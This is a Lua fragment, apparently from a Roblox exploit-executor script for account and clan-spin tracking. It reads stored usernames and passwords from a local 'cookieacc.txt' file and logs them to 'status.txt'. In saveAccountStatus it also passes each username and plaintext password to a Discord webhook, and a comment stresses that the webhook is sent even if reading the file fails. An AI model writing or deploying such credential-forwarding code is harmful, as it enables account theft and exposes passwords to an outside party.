local function saveAccountStatus(username, clanName)
    local pass = "Unknown"
    pcall(function()
        local content = nil
        pcall(function() content = readfile("cookieacc.txt") end)
        if content then
            for line in string.gmatch(content, "[^\r\n]+") do
                local parts = string.split(line, ":")
                if parts[1] and string.lower(parts[1]) == string.lower(username) then
                    pass = parts[2] or "Unknown"
                    break
                end
            end
        end

        local creds = string.format("%s:%s", username, pass)
        local lineToSave = string.format("%s  : %s\n", creds, clanName)

        local currentStatus = ""
        pcall(function() currentStatus = readfile("status.txt") end)

        if not string.find(currentStatus, username) then
            if typeof(appendfile) == "function" then
                appendfile("status.txt", lineToSave)
            else
                writefile("status.txt", (currentStatus or "") .. lineToSave)
            end
        end
    end)

    -- Luôn gửi webhook kể cả khi đọc file bị lỗi
    sendDiscordWebhook(username, pass, clanName)
    return username .. ":" .. pass
end

-- Read Player Data
local function fetchPlayerData()
    local clan = "N/A"
    local totalSpins = 0

    pcall(function()
        local pService = ReplicatedStorage:FindFirstChild("Player_Service")
        local pData = pService and pService:FindFirstChild("Data") and (pService.Data:FindFirstChild(LocalPlayer.Name) or pService.Data:WaitForChild(LocalPlayer.Name, 3))
        
        if pData then
            local slot1 = (pData:FindFirstChild("slots") and pData.slots:FindFirstChild("Slot1")) or pData:FindFirstChild("Slot1")
            if slot1 and slot1:FindFirstChild("Clan") then
                clan = tostring(slot1.Clan.Value)
            end

            local acc = pData:FindFirstChild("AccountSpins") and tonumber(pData.AccountSpins.Value) or 0
            local clanSpins = pData:FindFirstChild("ClanSpins") and tonumber(pData.ClanSpins.Value) or 0
            local genSpins = pData:FindFirstChild("Spins") and tonumber(pData.Spins.Value) or 0

            local free = 0
            local slot = 0
            local spinFolder = (slot1 and slot1:FindFirstChild("Spinning")) or pData:FindFirstChild("Spinning")
            if spinFolder then
                free = (spinFolder:FindFirstChild("FreeClanSpins") and tonumber(spinFolder.FreeClanSpins.Value)) or (spinFolder:FindFirstChild("FreeSpins") and tonumber(spinFolder.FreeSpins.Value)) or 0
                slot = (spinFolder:FindFirstChild("Spins") and tonumber(spinFolder.Spins.Value)) or (spinFolder:FindFirstChild("ClanSpins") and tonumber(spinFolder.ClanSpins.Value)) or 0
            end

            totalSpins = math.max(totalSpins, acc + clanSpins + genSpins + free + slot)
        end

        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
        if leaderstats and leaderstats:FindFirstChild("Spins") then
            totalSpins = math.max(totalSpins, tonumber(leaderstats.Spins.Value) or 0)
        end
    end)

    return clan, totalSpins
end

